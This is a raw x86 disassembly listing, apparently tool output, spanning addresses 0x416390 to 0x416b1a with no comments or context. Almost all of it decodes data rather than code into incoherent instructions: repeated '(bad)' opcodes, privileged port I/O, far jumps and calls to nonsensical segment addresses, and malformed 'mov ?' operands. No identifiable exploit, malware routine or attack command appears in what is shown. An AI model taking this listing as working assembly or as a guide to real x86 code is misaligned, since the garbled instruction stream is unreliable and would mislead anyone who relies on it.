  416390:	loopne 0x4163ad
  416392:	lods   al,BYTE PTR ds:[esi]
  416393:	scas   al,BYTE PTR es:[edi]
  416394:	pop    es
  416395:	in     al,dx
  416396:	(bad)  
  416397:	scas   al,BYTE PTR es:[edi]
  416398:	dec    ebp
  416399:	scas   eax,DWORD PTR es:[edi]
  41639a:	or     al,0x16
  41639c:	cmp    eax,0x98161604
  4163a1:	sub    WORD PTR ds:0x3413fee,0x37
  4163a9:	ja     0x6bc032eb
  4163af:	mov    esi,0x7568885f
  4163b4:	mov    dh,0xca
  4163b6:	ins    BYTE PTR es:[edi],dx
  4163b7:	adc    edi,DWORD PTR [esi+eiz*4]
  4163ba:	adc    ebp,DWORD PTR [ebp+ebp*2-0x48]
  4163be:	mov    WORD PTR [esi],cs
  4163c0:	xchg   BYTE PTR [ecx],ch
  4163c2:	xor    BYTE PTR [esi-0x594d32e8],cl
  4163c8:	(bad)  
  4163c9:	test   dh,cl
  4163cb:	jle    0x41640c
  4163cd:	mov    ch,BYTE PTR [esi-0x65]
  4163d0:	sbb    ah,ch
  4163d2:	mov    al,ds:0x49a489ed
  4163d7:	pop    edi
  4163d8:	jns    0x4163b0
  4163da:	jl     0x4163b4
  4163dc:	ror    BYTE PTR [ebx+0x39],0x4f
  4163e0:	outs   dx,BYTE PTR ds:[esi]
  4163e1:	jl     0x4163dd
  4163e3:	xchg   edi,eax
  4163e4:	(bad)  
  4163e5:	xor    bh,bh
  4163e7:	dec    esi
  4163e8:	or     BYTE PTR [esi+0x6b25242],bl
  4163ee:	and    DWORD PTR [ecx],0x60
  4163f1:	mov    eax,ds:0xea4d66af
  4163f6:	xor    dl,dh
  4163f8:	leave  
  4163f9:	cmp    BYTE PTR [ecx],cl
  4163fb:	jno    0x416455
  4163fd:	(bad)  
  4163fe:	(bad)  
  416400:	iret   
  416401:	stos   DWORD PTR es:[edi],eax
  416402:	pop    es
  416403:	mov    bh,0xac
  416405:	xor    DWORD PTR [ebx],ebp
  416407:	pop    eax
  416408:	ins    BYTE PTR es:[edi],dx
  416409:	in     eax,0x89
  41640b:	enter  0xa83e,0xc1
  41640f:	mov    al,0xe6
  416411:	mov    esp,0xabad1e44
  416416:	cmp    DWORD PTR ds:0x1bcb578d,edx
  41641c:	stos   DWORD PTR es:[edi],eax
  41641d:	imul   esp,edi,0xffffffa8
  416420:	retf   
  416421:	ja     0x4163a9
  416423:	jge    0x41645a
  416425:	aaa    
  416426:	cwde   
  416427:	ror    DWORD PTR [edi],1
  416429:	test   eax,0xa966193d
  41642e:	mov    bh,BYTE PTR [eax+0x5d]
  416431:	pop    esi
  416432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416433:	and    dh,BYTE PTR [esi+0x168ded89]
  416439:	xor    ch,al
  41643b:	sub    eax,0x110207b7
  416440:	mov    edi,0xdaf48c8c
  416445:	mov    edi,0x7e7bdd33
  41644a:	mov    al,0x98
  41644c:	clc    
  41644d:	pop    es
  41644e:	xchg   DWORD PTR [ebp+0x18b2d6e],ebx
  416454:	or     DWORD PTR [ecx],0xffffff84
  416457:	inc    ecx
  416458:	sub    ah,BYTE PTR [ebp+eiz*4+0x32]
  41645c:	adc    al,0xb8
  41645e:	outs   dx,BYTE PTR ds:[esi]
  41645f:	hlt    
  416460:	scas   eax,DWORD PTR es:[edi]
  416461:	fcom   DWORD PTR [esi+edi*4]
  416464:	sub    BYTE PTR [edi],0x39
  416467:	push   ss
  416468:	sbb    DWORD PTR [esi],edx
  41646a:	sbb    ecx,ebp
  41646c:	imul   edi,DWORD PTR [esi-0x63],0xc086a8db
  416473:	call   0xc8720bba
  416478:	or     BYTE PTR [edi+0x2d],bh
  41647b:	mov    ds:0x151251a8,eax
  416480:	dec    esi
  416481:	or     bl,BYTE PTR [edx]
  416483:	sbb    cl,BYTE PTR [ebp+0x12]
  416486:	les    ebx,FWORD PTR [ebp+0x6df8378]
  41648c:	mov    ah,0xdb
  41648e:	jecxz  0x416509
  416490:	je     0x4164ef
  416492:	dec    edi
  416493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416494:	xlat   BYTE PTR ds:[ebx]
  416495:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  416497:	lock sub al,0x28
  41649a:	lods   eax,DWORD PTR ds:[esi]
  41649b:	rcl    BYTE PTR [esi+0x7332df8b],cl
  4164a1:	je     0x41646b
  4164a3:	add    ebx,DWORD PTR [ecx+0x252c3ec7]
  4164a9:	int3   
  4164aa:	test   DWORD PTR [ecx],esi
  4164ac:	lods   eax,DWORD PTR ds:[esi]
  4164ad:	cmp    edx,ebp
  4164af:	push   eax
  4164b0:	mov    eax,ds:0xbed20ca2
  4164b5:	dec    ebp
  4164b6:	fimul  DWORD PTR gs:[ebx]
  4164b9:	mov    ebp,0x5cbc7689
  4164be:	jecxz  0x416461
  4164c0:	push   es
  4164c1:	xchg   edx,eax
  4164c2:	sbb    DWORD PTR [ebp+0x98b3671],edi
  4164c8:	imul   edx,DWORD PTR [edx+0x47],0xfffffff5
  4164cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164cd:	push   0xf97cbaa9
  4164d2:	jb     0x4164fc
  4164d4:	enter  0x9a9b,0x90
  4164d8:	call   0x363e:0xde74dc2b
  4164df:	rcl    BYTE PTR [esi+0x4f4acc36],1
  4164e5:	jmp    0x2f62528d
  4164ea:	sbb    al,0xa2
  4164ec:	mov    al,0x59
  4164ee:	loop   0x4164ae
  4164f0:	out    dx,eax
  4164f1:	dec    ebx
  4164f2:	push   ss
  4164f3:	mov    esp,DWORD PTR [esi-0x5e]
  4164f6:	mov    ?,edx
  4164f8:	inc    ecx
  4164f9:	sbb    eax,ebx
  4164fb:	mov    edi,DWORD PTR [ebx]
  4164fd:	loopne 0x41652e
  4164ff:	mov    ah,0x78
  416501:	pop    edi
  416502:	adc    ecx,DWORD PTR [ecx]
  416504:	jmp    0x41650f
  416506:	add    eax,0xd52a44f5
  41650b:	aas    
  41650c:	stc    
  41650d:	outs   dx,DWORD PTR ds:[esi]
  41650e:	dec    eax
  41650f:	(bad)  
  416510:	adc    eax,0x11097998
  416515:	and    esp,DWORD PTR [ebp+0x4f]
  416518:	jns    0x4164f1
  41651a:	sbb    BYTE PTR [ecx],dl
  41651c:	cdq    
  41651d:	inc    esi
  41651e:	sbb    DWORD PTR [edi-0x58],ecx
  416521:	sbb    edi,esp
  416523:	push   ebp
  416524:	scas   al,BYTE PTR es:[edi]
  416525:	and    bl,al
  416527:	mov    dh,0x44
  416529:	cmc    
  41652a:	cdq    
  41652b:	(bad)  
  41652c:	bswap  esi
  41652e:	addr16 dec ebx
  416530:	fsub   QWORD PTR [edi+0x6c0e2343]
  416536:	push   cs
  416537:	mov    cl,0x5d
  416539:	pusha  
  41653a:	inc    esp
  41653b:	inc    esi
  41653c:	scas   al,BYTE PTR es:[edi]
  41653d:	push   ecx
  41653e:	in     al,0xf0
  416540:	(bad)  
  416541:	loope  0x4164fa
  416543:	es pop bx
  416546:	push   edx
  416547:	inc    esp
  416548:	fwait
  416549:	dec    bl
  41654b:	mov    esp,0xb44dee56
  416550:	test   eax,0xa2f2b076
  416555:	xor    DWORD PTR [ebx],0x4a6d7a60
  41655b:	arpl   bx,cx
  41655d:	mov    cs,WORD PTR [ebp-0x72]
  416560:	xor    DWORD PTR [edi+0x415a65ed],ebx
  416566:	mov    ds:0xb670103c,eax
  41656b:	xor    ebx,DWORD PTR [ebx]
  41656d:	stos   DWORD PTR es:[edi],eax
  41656e:	fstp   DWORD PTR [esi+ebp*8+0x15]
  416572:	xor    DWORD PTR [esi+edi*1],eax
  416575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416576:	out    dx,eax
  416577:	cs aaa 
  416579:	(bad)  
  41657a:	dec    ebp
  41657b:	jns    0x41651d
  41657d:	sbb    al,0x12
  41657f:	pop    es
  416580:	jmp    0x416537
  416582:	rcr    ecx,1
  416584:	mov    esi,0x95c21d97
  416589:	push   ecx
  41658a:	dec    edx
  41658b:	xor    al,ch
  41658d:	dec    ebx
  41658e:	and    DWORD PTR [ebp+0x6b4f784],esp
  416594:	es jmp 0x41654d
  416597:	outs   dx,DWORD PTR ds:[esi]
  416598:	ss jmp 0x1c822571
  41659e:	mov    cl,0x86
  4165a0:	inc    edx
  4165a1:	call   0x80:0x591fbbc8
  4165a8:	jnp    0x4165e4
  4165aa:	popa   
  4165ab:	inc    edi
  4165ac:	mov    dl,dl
  4165ae:	in     al,0x22
  4165b0:	sar    DWORD PTR [eax+0x32],cl
  4165b3:	add    eax,0xc4914c56
  4165b8:	ins    DWORD PTR es:[edi],dx
  4165b9:	cmp    eax,DWORD PTR [edx]
  4165bb:	lods   eax,DWORD PTR ds:[esi]
  4165bc:	or     bh,bh
  4165be:	adc    bh,bl
  4165c0:	dec    esi
  4165c1:	fcmovne st,st(4)
  4165c3:	mov    ds:0xc34f469c,al
  4165c8:	imul   edi,DWORD PTR ds:0xeceb5a44,0xffffffca
  4165cf:	xor    edx,DWORD PTR [ecx+0x2c]
  4165d2:	shr    BYTE PTR [eax-0x4b],1
  4165d5:	mov    al,0xcb
  4165d7:	push   esp
  4165d8:	dec    edi
  4165d9:	add    dh,bl
  4165db:	jg     0x41657e
  4165dd:	xor    BYTE PTR [eax],0xdf
  4165e0:	cdq    
  4165e1:	cmp    BYTE PTR [ebx-0xa99b961],0x59
  4165e8:	sbb    ebp,DWORD PTR [edi+ecx*1-0x1bb3053a]
  4165ef:	mul    DWORD PTR [ecx]
  4165f1:	sbb    eax,0x7ef70e8c
  4165f6:	xor    eax,0xe394aacd
  4165fb:	in     al,0x5f
  4165fd:	xor    al,0xe
  4165ff:	xor    ebp,DWORD PTR [eax-0x1970ba4]
  416605:	and    al,0xcb
  416607:	dec    edx
  416608:	stc    
  416609:	das    
  41660a:	(bad)  
  41660b:	(bad)  [ebp+0x37]
  41660e:	dec    esi
  41660f:	cmp    eax,0xec431c18
  416614:	jecxz  0x41660b
  416616:	mov    ch,dh
  416618:	mov    bh,0x1e
  41661a:	mov    bl,0xae
  41661c:	lds    eax,FWORD PTR [ebp-0x2aed0afc]
  416622:	mov    cl,0x88
  416624:	xchg   ebx,eax
  416625:	addr16 gs repz ret 
  416629:	mov    ch,0xbe
  41662b:	xchg   edi,eax
  41662c:	mov    ebp,0xddaeb354
  416631:	mov    bh,0x8d
  416633:	pshufw mm4,mm6,0x35
  416637:	sbb    edx,ebx
  416639:	mov    dl,0xf5
  41663b:	test   al,0x60
  41663d:	aad    0xf5
  41663f:	movntps XMMWORD PTR [eax-0x112152f2],xmm3
  416646:	mov    esp,esp
  416648:	mov    eax,ds:0x31740f88
  41664d:	xor    cl,ah
  41664f:	call   0xcf3f:0x98c762f8
  416656:	int3   
  416657:	pop    es
  416658:	cli    
  416659:	inc    edi
  41665a:	fbld   TBYTE PTR [ebx+0x8]
  41665d:	test   DWORD PTR [ebx-0x44],esp
  416660:	pusha  
  416661:	mov    ds:0x49b4cfed,eax
  416666:	dec    ecx
  416667:	inc    edi
  416668:	or     esi,edx
  41666a:	adc    eax,0x70d8e14c
  41666f:	inc    ebx
  416670:	(bad)  
  416671:	jmp    0xb33a:0x8be3bcc7
  416678:	enter  0x1561,0xc1
  41667c:	rcr    DWORD PTR ds:0x23ebb130,1
  416682:	mov    ebx,esp
  416684:	rol    bl,1
  416686:	mov    bl,0x97
  416688:	stos   DWORD PTR es:[edi],eax
  416689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41668a:	and    ah,BYTE PTR [edi+ebp*2-0x4e7867db]
  416691:	push   esp
  416692:	(bad)  
  416693:	jns    0x4166b4
  416695:	ret    
  416696:	test   al,0xb2
  416698:	cwde   
  416699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41669a:	mov    dh,0x54
  41669c:	fwait
  41669d:	shr    DWORD PTR [esi+0x64],0x52
  4166a1:	inc    eax
  4166a2:	(bad)  
  4166a3:	cli    
  4166a4:	add    BYTE PTR [ebx],0xf1
  4166a7:	sti    
  4166a8:	mov    ebp,0xda0874e3
  4166ad:	nop
  4166ae:	jp     0x4166da
  4166b0:	stos   BYTE PTR es:[edi],al
  4166b1:	cld    
  4166b2:	jbe    0x4166ca
  4166b4:	xchg   esp,eax
  4166b5:	fild   WORD PTR [esi]
  4166b7:	cld    
  4166b8:	ja     0x416664
  4166ba:	sbb    BYTE PTR [edi+0x74320883],bh
  4166c0:	das    
  4166c1:	xor    al,0xf
  4166c3:	xchg   ebp,eax
  4166c4:	mov    esp,0x435a3244
  4166c9:	test   BYTE PTR [ebx-0x11],dl
  4166cc:	jecxz  0x41668f
  4166ce:	or     DWORD PTR [ecx-0x30],esp
  4166d1:	and    BYTE PTR [esi],bl
  4166d3:	aas    
  4166d4:	mov    eax,0x6f1f5434
  4166d9:	pop    edx
  4166da:	pop    ss
  4166db:	imul   edi,DWORD PTR [edx+0x4f],0x9
  4166df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e0:	push   ebx
  4166e1:	clc    
  4166e2:	push   ebp
  4166e3:	cmp    bh,al
  4166e5:	jge    0x416764
  4166e7:	jecxz  0x41668e
  4166e9:	outs   dx,DWORD PTR ds:[esi]
  4166ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166eb:	inc    ebp
  4166ec:	(bad)  
  4166ed:	jb     0x41673f
  4166ef:	xchg   ebp,eax
  4166f0:	aaa    
  4166f1:	cmp    BYTE PTR [esi+0x2c],al
  4166f4:	lods   al,BYTE PTR ds:[esi]
  4166f5:	mov    cl,0x72
  4166f7:	and    al,0x54
  4166f9:	pop    ebp
  4166fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166fb:	stos   BYTE PTR es:[edi],al
  4166fc:	xchg   esi,eax
  4166fd:	mov    ecx,0x55cbb3e
  416702:	xor    BYTE PTR [ebp-0x5d],dl
  416705:	add    eax,0xd5a27ac5
  41670a:	enter  0x41fb,0xea
  41670e:	test   eax,0x6edd6201
  416713:	xor    al,0x9a
  416715:	or     bh,BYTE PTR [ecx-0x43]
  416718:	push   0x3b
  41671a:	push   0xffffff8b
  41671c:	xchg   edx,eax
  41671d:	or     al,0x43
  41671f:	xlat   BYTE PTR ds:[ebx]
  416720:	(bad)  
  416721:	jmp    0x3c36:0x5e2214cd
  416728:	icebp  
  416729:	mov    ah,0xb
  41672b:	cdq    
  41672c:	xchg   ebp,eax
  41672d:	jbe    0x41671c
  41672f:	or     al,ch
  416731:	outs   dx,BYTE PTR ds:[esi]
  416732:	push   ebx
  416733:	jecxz  0x416739
  416735:	fisttp DWORD PTR [ebx+0x73]
  416738:	and    DWORD PTR [ebx-0x453dc8dd],0x2263975c
  416742:	jo     0x416777
  416744:	mul    cl
  416746:	pop    edx
  416747:	out    0x82,al
  416749:	add    cl,BYTE PTR [esi]
  41674b:	fild   WORD PTR [esi+0x4f13edd0]
  416751:	and    eax,0xce5537b6
  416756:	add    al,BYTE PTR [esi-0x47]
  416759:	mov    esp,0x418136b
  41675e:	int    0x9e
  416760:	fist   DWORD PTR [ebp+0x974dff4]
  416766:	push   edx
  416767:	imul   BYTE PTR [ebx+0x13bcf069]
  41676d:	ins    BYTE PTR es:[edi],dx
  41676e:	in     al,dx
  41676f:	mov    bh,ah
  416771:	out    dx,al
  416772:	nop
  416773:	push   cs
  416774:	pop    ds
  416775:	sub    eax,0xac3b287b
  41677a:	jge    0x4167a8
  41677c:	or     BYTE PTR [ebx+0x1e],0x9b
  416780:	out    0xd0,al
  416782:	ffree  st(0)
  416784:	add    eax,0x6b3439ad
  416789:	or     DWORD PTR [eax+0x73],esp
  41678c:	mov    ebp,0x3f1b5c8d
  416791:	push   edi
  416792:	mov    al,ds:0x589c9c51
  416797:	je     0x416739
  416799:	sti    
  41679a:	sub    cl,BYTE PTR [edi-0x23]
  41679d:	mov    es,WORD PTR [eax-0x75]
  4167a0:	xchg   ecx,eax
  4167a1:	pop    ecx
  4167a2:	pop    ebp
  4167a3:	jae    0x416804
  4167a5:	fld    DWORD PTR [ebx-0x190f7398]
  4167ab:	es and ecx,edx
  4167ae:	push   ds
  4167af:	pop    eax
  4167b0:	xchg   edx,eax
  4167b1:	ins    BYTE PTR es:[edi],dx
  4167b2:	push   ecx
  4167b3:	inc    ebx
  4167b4:	test   DWORD PTR [ebx+0x79f63ed],ecx
  4167ba:	add    BYTE PTR [ebx],0x55
  4167bd:	lock loope 0x4167f9
  4167c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167c1:	lock cwde 
  4167c3:	dec    esi
  4167c4:	xchg   ebx,eax
  4167c5:	shl    al,cl
  4167c7:	sub    eax,0xc5197f31
  4167cc:	dec    ebx
  4167cd:	add    bh,BYTE PTR [edi]
  4167cf:	mov    ecx,0xdd8a4a4d
  4167d4:	or     DWORD PTR [ebx],0x978131e1
  4167da:	pushf  
  4167db:	xchg   ecx,eax
  4167dc:	shl    bl,0x49
  4167df:	sub    al,0xea
  4167e1:	adc    cl,ch
  4167e3:	jne    0x416789
  4167e5:	push   edx
  4167e6:	dec    ebp
  4167e7:	mov    ebp,0x7299347e
  4167ec:	and    ah,bl
  4167ee:	daa    
  4167ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167f0:	fldcw  WORD PTR fs:[eax-0xe]
  4167f4:	or     ecx,DWORD PTR [ecx]
  4167f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f7:	rol    BYTE PTR [ecx+0x67],1
  4167fa:	clc    
  4167fb:	add    eax,0x1718d8c0
  416800:	adc    edi,DWORD PTR [ebp-0x6b]
  416803:	fcom   DWORD PTR [edi]
  416805:	outs   dx,DWORD PTR ds:[esi]
  416806:	inc    eax
  416807:	outs   dx,BYTE PTR cs:[esi]
  416809:	jge    0x416802
  41680b:	mov    ecx,0x54289c8f
  416810:	fldl2t 
  416812:	xchg   ecx,eax
  416813:	div    BYTE PTR [esi]
  416815:	daa    
  416816:	not    BYTE PTR [edx-0xe19fa86]
  41681c:	loop   0x416885
  41681e:	outs   dx,DWORD PTR ds:[esi]
  41681f:	shr    ebp,0xea
  416822:	adc    BYTE PTR [ebp-0x5e],bl
  416825:	mov    bl,0xde
  416827:	jg     0x4168a7
  416829:	enter  0xf6d1,0x51
  41682d:	dec    esp
  41682e:	gs xor eax,0x753714a6
  416834:	xchg   edx,eax
  416835:	add    al,0xfe
  416837:	out    dx,al
  416838:	xor    al,0x5d
  41683a:	push   edx
  41683b:	sbb    DWORD PTR [ebp+0x3],esi
  41683e:	push   ebp
  41683f:	mov    ds:0x5263a145,al
  416844:	jl     0x4168b3
  416846:	mov    ebx,0x251f8f10
  41684b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41684c:	inc    ebx
  41684d:	and    ecx,edx
  41684f:	outs   dx,BYTE PTR ds:[esi]
  416850:	stos   BYTE PTR es:[edi],al
  416851:	pop    esp
  416852:	mov    cl,0x29
  416854:	in     eax,dx
  416855:	dec    esi
  416856:	repz fist DWORD PTR [edi]
  416859:	or     ch,dl
  41685b:	aam    0xff
  41685d:	cwde   
  41685e:	inc    esp
  41685f:	retf   
  416860:	iret   
  416861:	int3   
  416862:	(bad)  
  416863:	xchg   esi,eax
  416864:	sahf   
  416865:	popf   
  416866:	sahf   
  416867:	repnz std 
  416869:	fadd   st,st(1)
  41686b:	aam    0xa
  41686d:	and    al,0xc3
  41686f:	cmp    esi,DWORD PTR [edi]
  416871:	mov    edx,0xf7749257
  416876:	out    dx,al
  416877:	fcomp  DWORD PTR [ebx-0x6cb03be7]
  41687d:	xchg   edx,eax
  41687e:	jmp    0x4672a490
  416883:	jmp    0x855c:0x8f0a5e8e
  41688a:	dec    ecx
  41688b:	lds    esi,FWORD PTR [esi+0x74]
  41688e:	mov    ebx,0x3c06b122
  416893:	or     ebp,DWORD PTR [ebx+0x29743831]
  416899:	pop    ebx
  41689a:	push   cs
  41689b:	rol    ah,0x26
  41689e:	shl    BYTE PTR [edi+0x4b],0x18
  4168a2:	jmp    0x4f860f50
  4168a7:	mov    ds:0xf18dad5e,al
  4168ac:	repz in al,dx
  4168ae:	adc    eax,DWORD PTR [ebp-0x6c]
  4168b1:	hlt    
  4168b2:	test   eax,0xe96311d1
  4168b7:	jecxz  0x41691d
  4168b9:	xchg   ebp,eax
  4168ba:	loop   0x416862
  4168bc:	sub    ch,dh
  4168be:	dec    esi
  4168bf:	repz mov al,ds:0x2e56154
  4168c5:	les    eax,FWORD PTR [eax+0x23b00baa]
  4168cb:	ds loope 0x4168cc
  4168ce:	or     al,0xa5
  4168d0:	pop    edx
  4168d1:	and    ebx,DWORD PTR cs:[eax+0x17e5e9d4]
  4168d8:	lods   eax,DWORD PTR ds:[esi]
  4168d9:	mov    ah,0xda
  4168db:	lea    ebx,[ebx+0x268e1321]
  4168e1:	in     al,dx
  4168e2:	pusha  
  4168e3:	dec    esi
  4168e4:	xchg   ecx,eax
  4168e5:	xor    BYTE PTR ds:0x643d9134,al
  4168eb:	retf   
  4168ec:	pop    ecx
  4168ed:	or     esi,DWORD PTR [eax]
  4168ef:	sub    BYTE PTR [ecx],al
  4168f1:	dec    edi
  4168f2:	mov    ch,0xcb
  4168f4:	mov    ah,BYTE PTR [esi]
  4168f6:	sub    eax,0x71214db3
  4168fb:	lods   eax,DWORD PTR ds:[esi]
  4168fc:	or     al,0x21
  4168fe:	inc    edx
  4168ff:	scas   al,BYTE PTR es:[edi]
  416900:	cmp    eax,0x99d36d8c
  416905:	xchg   BYTE PTR gs:[ecx],ch
  416908:	lea    ecx,[edx-0x743090f7]
  41690e:	shl    BYTE PTR [ebx],1
  416910:	rol    cl,0xe2
  416913:	push   ds
  416914:	mov    DWORD PTR [ebp+0x10],eax
  416917:	mov    eax,DWORD PTR [esi]
  416919:	xor    edx,0xc0000000
  41691f:	mov    DWORD PTR [ebp+0x14],edx
  416922:	mov    edx,DWORD PTR [esi+0x4]
  416925:	jmp    0x416eaf
  41692a:	or     BYTE PTR [edx+0x20a461f6],ch
  416930:	jns    0x416944
  416932:	stc    
  416933:	repz sbb BYTE PTR [eax+0x741afe7e],ch
  41693a:	jp     0x4168d9
  41693c:	or     al,0x16
  41693e:	cmp    eax,0xb2161604
  416943:	mov    ah,0xf2
  416945:	out    dx,eax
  416946:	loope  0x416931
  416948:	mov    esp,0xafb9d641
  41694d:	adc    al,0xda
  41694f:	je     0x41699c
  416951:	lahf   
  416952:	pop    ebx
  416953:	inc    ecx
  416954:	(bad)  
  416955:	jne    0x416980
  416957:	pop    eax
  416958:	jmp    0x44a4:0xac83b4c5
  41695f:	retf   0x2c06
  416962:	pop    es
  416963:	int3   
  416964:	inc    esi
  416965:	xchg   esi,eax
  416966:	inc    esi
  416967:	and    esp,DWORD PTR [ebx-0x7]
  41696a:	mov    dl,0xf1
  41696c:	mov    eax,ds:0x6982de5c
  416971:	cmp    eax,0x33ca120b
  416976:	xchg   esp,eax
  416977:	push   ds
  416978:	std    
  416979:	gs and BYTE PTR gs:[ecx+0x56],ah
  41697e:	cwde   
  41697f:	icebp  
  416980:	sbb    eax,0x40d5da40
  416985:	xlat   BYTE PTR ds:[ebx]
  416986:	rol    DWORD PTR [edx+ebp*4+0x11ebf0db],1
  41698d:	dec    edx
  41698e:	inc    eax
  41698f:	out    0xe5,al
  416991:	pop    ebp
  416992:	push   esi
  416993:	sub    eax,0xa94795f0
  416998:	adc    eax,0xe6246540
  41699d:	je     0x4169c5
  41699f:	inc    edi
  4169a0:	aam    0xb3
  4169a2:	jge    0x4169cb
  4169a4:	dec    edi
  4169a5:	nop
  4169a6:	adc    eax,0x9baebbea
  4169ab:	inc    BYTE PTR [edi]
  4169ad:	jp     0x41699d
  4169af:	int    0x7d
  4169b1:	ins    DWORD PTR es:[edi],dx
  4169b2:	xchg   ebx,eax
  4169b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169b4:	rcl    DWORD PTR [esi+eiz*4-0x62],1
  4169b8:	lds    edx,FWORD PTR [edi-0x5e]
  4169bb:	cs scas eax,DWORD PTR es:[edi]
  4169bd:	popf   
  4169be:	outs   dx,DWORD PTR ds:[esi]
  4169bf:	ss cli 
  4169c1:	dec    edi
  4169c2:	pop    esi
  4169c3:	push   ss
  4169c4:	push   esi
  4169c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169c6:	mov    dl,0x45
  4169c8:	ror    esp,1
  4169ca:	(bad)  
  4169cb:	jl     0x416a36
  4169cd:	xrelease xchg DWORD PTR [edi+edx*8],esi
  4169d1:	js     0x416965
  4169d3:	cwde   
  4169d4:	adc    ch,BYTE PTR [ebp+0x61]
  4169d7:	addr16 test al,0x88
  4169da:	sbb    ebx,DWORD PTR [ebx+ebp*1]
  4169dd:	mov    ebp,0x4c57637e
  4169e2:	jmp    0x41699c
  4169e4:	mov    eax,ds:0x601e116b
  4169e9:	and    cl,BYTE PTR [ebx]
  4169eb:	mov    esp,0x4d0c441d
  4169f0:	jne    0x4169cf
  4169f2:	mov    ah,ah
  4169f4:	call   0x38555c64
  4169f9:	mov    edi,0x7e4d8c86
  4169fe:	push   edx
  4169ff:	mov    bh,BYTE PTR [ebx-0x5b9c74af]
  416a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a06:	shl    DWORD PTR [esi+ecx*8-0xb],0xe1
  416a0b:	mov    eax,0x367d3f7
  416a10:	mov    ?,WORD PTR [edx+edi*8-0x5d5c259]
  416a17:	out    0x18,al
  416a19:	xchg   BYTE PTR [edx-0x1d],ch
  416a1c:	mov    bh,0x56
  416a1e:	fcmovnu st,st(5)
  416a20:	in     eax,0xaf
  416a22:	lds    ebx,FWORD PTR [ebx+0x50599eea]
  416a28:	div    BYTE PTR [edi+ecx*2]
  416a2b:	jns    0x416a2a
  416a2d:	adc    DWORD PTR [ebp+0x19fe086d],edi
  416a33:	jae    0x416a5f
  416a35:	dec    ebx
  416a36:	das    
  416a37:	shl    DWORD PTR [ebx-0x27],cl
  416a3a:	or     esi,0xffffffeb
  416a3d:	stc    
  416a3e:	outs   dx,DWORD PTR ds:[esi]
  416a3f:	ins    BYTE PTR es:[edi],dx
  416a40:	mov    edx,0xc18d76ac
  416a45:	or     BYTE PTR [edi+0x6a],al
  416a48:	(bad)  
  416a49:	cli    
  416a4a:	dec    edx
  416a4b:	add    esi,esi
  416a4d:	xlat   BYTE PTR ds:[ebx]
  416a4e:	jb     0x416a10
  416a50:	or     DWORD PTR [edi+0x1b],0xffffff93
  416a54:	div    DWORD PTR [esp+esi*1-0x4c7fbbe3]
  416a5b:	dec    ebx
  416a5c:	cmp    esi,DWORD PTR gs:[ebp-0x16192547]
  416a63:	rcr    DWORD PTR [ebx],1
  416a65:	add    cl,al
  416a67:	dec    esp
  416a68:	jae    0x416acf
  416a6a:	cmp    al,0x62
  416a6c:	and    al,0x3f
  416a6e:	adc    bh,0x0
  416a71:	jbe    0x416a2f
  416a73:	xor    ch,0xf
  416a76:	or     eax,0xe16d789f
  416a7b:	aad    0xbc
  416a7d:	mov    eax,ds:0xf13ecf7d
  416a82:	data16 int3 
  416a84:	call   0x78b2:0xe5cbfb60
  416a8b:	dec    ecx
  416a8c:	fild   DWORD PTR [eax+0x1a261bd1]
  416a92:	adc    al,0xbe
  416a94:	das    
  416a95:	pop    es
  416a96:	or     al,0x48
  416a98:	not    edi
  416a9a:	aad    0xcb
  416a9c:	icebp  
  416a9d:	(bad)  
  416a9e:	in     eax,0x7d
  416aa0:	popa   
  416aa1:	sti    
  416aa2:	push   0x1e
  416aa4:	es lock into 
  416aa7:	jno    0x416a3f
  416aa9:	in     eax,0x27
  416aab:	mov    cl,0xb5
  416aad:	pop    ebx
  416aae:	xor    DWORD PTR [ecx+eiz*4],eax
  416ab1:	xlat   BYTE PTR ds:[ebx]
  416ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ab3:	or     eax,DWORD PTR [ecx]
  416ab5:	push   ecx
  416ab6:	jl     0x416abf
  416ab8:	jmp    0x75e482fb
  416abd:	(bad)  
  416abe:	mov    esp,0xfb2c95a
  416ac3:	adc    al,ch
  416ac5:	mov    ah,0xe7
  416ac7:	add    BYTE PTR [esi+0x47],ah
  416aca:	mov    al,ds:0x6c312153
  416acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ad0:	mov    al,ds:0x73e1ca1b
  416ad5:	fwait
  416ad6:	mov    ecx,0x915a691c
  416adb:	inc    esp
  416adc:	xchg   ecx,eax
  416add:	arpl   cx,si
  416adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ae0:	jns    0x416a7f
  416ae2:	popf   
  416ae3:	sub    esi,DWORD PTR [edx+edi*1]
  416ae6:	add    eax,0x5bb8c375
  416aeb:	bound  edi,QWORD PTR [edi+eiz*8-0x1d63a85c]
  416af2:	loop   0x416a9b
  416af4:	leave  
  416af5:	cmp    DWORD PTR [ebx],0x39
  416af8:	push   eax
  416af9:	in     eax,dx
  416afa:	mov    esp,fs
  416afc:	and    DWORD PTR [esi],ebx
  416afe:	push   cs
  416aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b00:	add    al,BYTE PTR [edi]
  416b02:	xor    eax,0xe249fad3
  416b07:	jbe    0x416aaa
  416b09:	sti    
  416b0a:	and    al,0xad
  416b0c:	xchg   BYTE PTR [esi-0x3e],al
  416b0f:	clc    
  416b10:	mov    al,0x38
  416b12:	and    DWORD PTR [edi],edx
  416b14:	push   edx
  416b15:	dec    esp
  416b16:	jno    0x416b38
  416b18:	shr    BYTE PTR [esi],cl
  416b1a:	je     0x416b13
